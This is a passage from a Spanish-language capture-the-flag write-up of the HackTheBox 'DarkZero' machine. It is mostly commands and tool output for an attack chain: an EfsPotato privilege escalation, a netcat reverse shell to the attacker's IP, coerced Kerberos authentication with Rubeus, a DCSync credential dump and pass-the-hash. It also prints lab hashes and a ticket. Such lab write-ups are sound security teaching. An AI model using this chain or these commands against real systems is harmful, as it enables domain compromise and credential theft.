[+] Using Station\Desktop: Service-0x0-29a41$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3316 created in background.
~~~ 

Desde nuestro listener recibiremos la nueva shell con el mismo usuario (`svc_sql`)

~~~ bash
connect to [10.10.16.203] from (UNKNOWN) [10.10.11.89] 62853
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
darkzero-ext\svc_sql
~~~

Al volver a listar los privilegios locales, veremos que ahora tenemos el privilegio `SeImpersonatePrivilege`

~~~ bash
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
~~~


## Abusing `SeImpersonatePrivilege`

`SeImpersonatePrivilege` es un privilegio local de Windows que permite a un proceso actuar con el token de seguridad de otro usuario después de haber sido autenticado correctamente.

### Understanding Attack

Este ataque se basa en el principio de que con `SeImpersonatePrivilege` necesitamos engañar a un proceso que corre como `SYSTEM` para que se conecte a un servidor que controlamos.

Al conectarse, el proceso `SYSTEM` "entrega" su `Access Token` al servicio del atacante, luego, mediante llamadas a la API de Windows puede crear un nuevo proceso privilegiado utilizando este token, ejecutando un comando con privilegios máximos.

> Un token de acceso (`Access Token`) es creado por un sistema Windows en el momento del inicio de sesión de un usuario.
{: .notice--info}

Es muy común el uso de las herramientas `Potato` para explotar este concepto, las cuales automatizan el flujo de explotación:

- Se crea un servicio `COM`/`DCOM` o `Named Pipes` falso a modo de recibir la autenticación.

- Se abusa de la interfaz `IStorage` y llamadas `COM` para forzar autenticación contra un puerto local.

- Cuando el proceso `SYSTEM` se autentica en el servidor falso, se captura la negociación y el atacante obtiene un `Impersonation Token`.

- El atacante duplica el token mediante llamadas a la API de Windows para convertir este token en un `Primary Token`.

### Tool Compilation from CLI

Podemos utilizar el compilador nativo (`csc.exe`) para compilar la herramienta `EfsPotato` para hacerla ejecutable

> `csc.exe` es el Compilador de Línea de Comandos de C# (`C Sharp Compiler`) de Microsoft, una parte legítima del .NET Framework que permite a los desarrolladores convertir código fuente C# en programas ejecutables (`.exe` o `.dll`) sin necesidad de un entorno de desarrollo completo como Visual Studio.
{: .notice--info}

``` bash
PS C:\Programdata> curl http://10.10.16.203/EfsPotato.cs -o EfsPotato.cs
PS C:\Programdata> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs

Microsoft (R) Visual C# Compiler version 4.8.4161.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

EfsPotato.cs(123,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.  http://go.microsoft.com/fwlink/?linkid=14202'
```

### Exploiting

Ejecutaremos la herramienta `EfsPotato.exe` seguida de un comando, este se ejecutará con privilegios de `system`

~~~ bash
PS C:\Programdata> .\EfsPotato.exe 'whoami'
.\EfsPotato.exe 'whoami'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: darkzero-ext\svc_sql
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=1358bc0)
[+] Get Token: 920
[!] process with pid: 1660 created.
==============================
nt authority\system
~~~

Iniciaremos un listener que se encargue de recibir una conexión remota por un puerto

~~~ bash
rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
~~~

Haremos uso de `netcat` para enviar una reverse shell privilegiada a nuestra IP

``` powershell
PS C:\Programdata> curl http://10.10.16.203/nc64.exe -o nc64.exe
PS C:\Programdata> .\EfsPotato.exe 'C:\Programdata\nc64.exe -e powershell.exe 10.10.16.203 443'

Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: darkzero-ext\svc_sql
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=13230a0)
[+] Get Token: 820
[!] process with pid: 2884 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818
```


## Shell as `Administrator` - `DC02`

Recibiremos una consola de `powershell` con privilegios elevados en `DC02`

~~~ bash
rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.16.203] from (UNKNOWN) [10.10.11.89] 62900

PS C:\Programdata> whoami
nt authority\system
~~~

Ya podremos ver la flag `user.txt`, ubicada en la carpeta de escritorio del usuario `Administrator` en `DC02`

~~~ bash
PS C:\Programdata> type C:\Users\Administrator\Desktop\user.txt
c7e...
~~~
<br>


# Escalada de Privilegios
---
## Abusing Kerberos Unconstrained Delegation - Coerced Authentication

Esta técnica contempla el abuso de la delegación sin restricciones de `kerberos` y la autenticación forzada hacia un servicio con `kerberos` como protocolo de autenticación.

Todo esto con el fin de obtener un `Ticket Granting Ticket` (TGT) privilegiado y utilizarlo para llevar a cabo otros ataques como DC Sync, Shadow Credentials, abuso de RBCD, etc.

### Understanding Attack

En el flujo de autenticación `kerberos`, cuando un `principal` accede a un servicio, presenta un ticket al host de servicio. Este ticket no se puede utilizar para autenticarse a otros servicios. 

Sin embargo, si una computadora o cuenta de servicio es de confianza para la delegación sin restricciones (`TRUSTED_FOR_DELEGATION`), el `principal` envía su `Ticket Granting Ticket` (TGT) completo, lo que permite reenviar el ticket y suplantar al usuario en otros servicios.

Ahora, un atacante puede obligar a una computadora de nivel `zero` (como un Controlador de Dominio) a autenticarse contra sí misma y obtener un TGT (`Coerced Attacks`). Posteriormente, este ticket puede utilizarse para realizar un ataque DC Sync, abusar de RBCD, etc.

### Enumeration

Podemos utilizar herramientas como `findDelegation` de `impacket` o `powerview.py` para enumerar la delegación de `kerberos`. Veremos el valor `TRUSTED_FOR_DELEGATION` en el atributo `userAccountControl` de la cuenta de computadora del DC

``` powershell
powerview darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb --dc-ip 10.10.11.89

╭─LDAPS─[DC01.darkzero.htb]─[darkzero\john.w]-[NS:<auto>]
╰─PV ❯ Get-DomainComputer -Unconstrained -Properties useraccountcontrol

userAccountControl     : SERVER_TRUST_ACCOUNT
                         TRUSTED_FOR_DELEGATION
vulnerabilities        : [VULN-005] Account has unconstrained delegation enabled (HIGH)
```

Este valor también podríamos haberlo visto desde `Bloodhound`

![image-center](/assets/images/posts/darkzero-1-hackthebox.png)
{: .align-center}

### Exploiting

Descargaremos y lanzaremos la herramienta `Rubeus` en `DC02` usando el modo `monitor` para mostrar nuevos tickets cada `X` segundos

~~~ bash
PS C:\Programdata> curl http://10.10.16.203/Rubeus.exe -o Rubeus.exe
PS C:\Programdata> .\Rubeus.exe monitor /targetuser:DC01$ /interval:10 /nowrap
~~~

Desde nuestra máquina, nos conectaremos nuevamente al servicio `MSSQL`, luego ejecutaremos el procedimiento almacenado `xp_dirtree` para forzar autenticación hacia un recurso falso que supuestamente se aloja en `DC02`.

> `xp_dirtree` es un procedimiento almacenado extendido (`XP`) en Microsoft SQL Server que permite listar el contenido de un directorio del sistema de archivos, devolviendo archivos y subdirectorios como una tabla.
{: .notice--info}

``` bash
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth

SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\thisresourcedoesntexists
subdirectory   depth   file   
------------   -----   ---- 
```

Desde `Rubeus`, veremos cómo el Controlador de Dominio (`DC01`) se ha autenticado usando `kerberos` hacia el recurso que solicitamos, por ende capturamos el TGT de la cuenta de computadora

~~~ bash
[*] 12/26/2025 4:13:08 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  12/25/2025 8:12:59 PM
  EndTime               :  12/26/2025 6:12:59 AM
  RenewTill             :  1/1/2026 8:12:59 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZfOgPGo2W62yy4p5mS47Zu7QcXfTQM1fNlz1RP3UwwTaymeKVzYtXw4SmKPQByzJsB2c1J7Q4zwVEp69GBQ56XW/BL1poxqKN0jhXOVUlBhrLLCRUCZcAvvYKnJuVXIf9b6tnS06El8lR5UHKmAFZQHNBUyM7C914PrwoUOwxrs5GTYZ3zoIFYfInLHn9iTNfTll4mxtg55X7ov6Q8629wehcpcu2nXToELEDZnKANByNnEYBiKkX6+vzKvq0BB5rDXStpA0IUBePCEU2dH/LQ13RBul2L94MPg+SVkrvIN5NSvBBTBhNiOGUZz6JXTdGUbmFhqsCWFtBwJWFVJF1mQ7n3qjyYg/2krgUrGs96nL4MrINqVX8jDeWfn5APiWUXiSo68YTNSTmgFx6dL2F4m/soa4q/vHsaPLaPY7ABgLYswOQahxPkE3x6BqtRXUwlCqgfzTdl6Oi9g55pfCi8OAmRdYrvXVMIKlFiXobyFtXOgei7ZWzFgWSQjwd7+J+l+V/nH1p/3k1Jp9PHQin6GhVpEdzw4F5NZh3cqSDhDiq20vMUE3Uwc9Ab5PsRNU1x0gE7/QckIgxyZeYl1ZLkvIrziI93dj9EN5EU+3rgarykhh3ehkPmGUTHsUF/nabhkdsl7dXM/HhtdDP8VjQZaf9ffkmi2scARdssbsZPAJyxUN1mrX2sVechyXqivEuwSUvIIRKeLYg9h2bpyINheOlmBMm0VK2F1/KMAVtuSXO7IoMo2obP6U8n5RlmkHoupN26aR3liHqhNztOEldzyIY/8WS/yJQn07mXAmgZlAvbPHq/vCmLtUZw0LHTK9VFD/pfW3E0Jjpi5tOi6Myoir84tH4KAjDUODzs24GRZ/3EW6HkYWt6ey68tLveEIDtrVUM/PwNedBZInwcbPUoKHSo0vVib7foZgQJdXSWJGna+EwpoIkB7J+grRyhzqMD2dAb7gjqe3bZklDPp4MnrvKkkzlG/y88wwSIx8l6BwPmAUsiJm9uz5RlTlLObWsoFvg0eljo8YxUOiilz5TR0+DsCrhagBNgC7koSxwRbuhb9eSuNOzOaICAQkB0V1JEyAM4Ca+Ae+xx3Ow1aKxA7xpchyOukesqsXeWGIk86wjy6epBZyqa9PCJlMFnXg/vdynLYSNlvWHvqyveKw2kYThrJOfmDIXXPkHcqOha7uz60Qg+fAIkN5tBBpPcCYFOtLEEebT5RubdoJ3yenhwQ25rnu8a8mEfa6HyJfIi5PV3Lkr5yYkhtM8mtnujRjniE7xPSEieRgcQQvZ74CJRFlnmMOg19ZRX+FHFmsT34expaqkCUjMckZniemuWqoWoX3Wk8wOS5hRVKbMCWMvgm4PY5ofggqxu+NycACKxyOGqo4zHP+vjj3A8RPYZNQ20JlZZcf1QsyOWwanXCzuP14k7Swkqo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgFbcF+nvjr4Kd3OumsI5uYaJu8t3sY/9jQnCicn4j5PWhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEyMjYwNDEyNTlaphEYDzIwMjUxMjI2MTQxMjU5WqcRGA8yMDI2MDEwMjA0MTI1OVqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

~~~

### Converting Ticket

Haremos el proceso de conversión desde nuestra máquina, para ello copiaremos el ticket en `base64` que nos muestra `Rubeus` para decodificarlo y guardarlo de la siguiente forma

``` bash
echo "<Base64EncodedTicket>" | base64 -d > ticket.kirbi
```

Ahora usaremos la herramienta `ticketConverter` para estructurar el ticket, de forma que obtengamos un archivo `.ccache` válido

``` bash
ticketConverter.py ticket.kirbi DC01\.ccache    

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Para el uso del ticket frente al DC, podemos exportar una variable de entorno llamada `KRB5CCNAME`

``` bash
export KRB5CCNAME=DC01.ccache
```


## DC Sync

Un ataque `DCSync` utiliza comandos del Protocolo remoto del servicio de replicación de directorios de Microsoft (`MS-DRSR`) para hacerse pasar por un controlador de dominio (DC) con el fin de obtener las credenciales de usuario de otro DC

![image-center](/assets/images/posts/darkzero-2-hackthebox.png)
{: .align-center}

Ejecutaremos la herramienta `secretsdump` para volcar todos los hashes NTLM del dominio principal (`darkzero.htb`)

~~~ bash
secretsdump.py darkzero.htb/'DC01$'@DC01.darkzero.htb -k -no-pass -just-dc

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:591...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up... 
~~~


## Root Time

Una vez ya tenemos el hash NTLM del usuario `Administrator`, podemos usarlo para hacer PassTheHash y conectarnos al Controlador de Dominio

``` bash
evil-winrm-py -i DC01.darkzero.htb -u 'Administrator' -H '591...'
 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.darkzero.htb:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
darkzero\administrator
```

Ya podremos ver la flag ubicada en el escritorio del usuario `Administrator`

~~~ bash
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
7a8...
~~~

> Every human being is the author of his own health or disease.
> — Buddha
{: .notice--info}